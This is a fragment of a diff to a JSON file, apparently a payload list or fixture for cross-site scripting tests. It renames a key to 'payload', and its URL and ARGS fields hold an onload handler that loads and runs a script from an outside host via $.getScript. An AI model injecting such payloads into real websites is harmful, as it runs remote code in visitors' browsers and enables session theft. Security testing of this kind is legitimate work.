@@ -1,5 +1,5 @@
 {
-  "req": [
+  "payload": [
     {
       "URL": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
       "ARGS": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
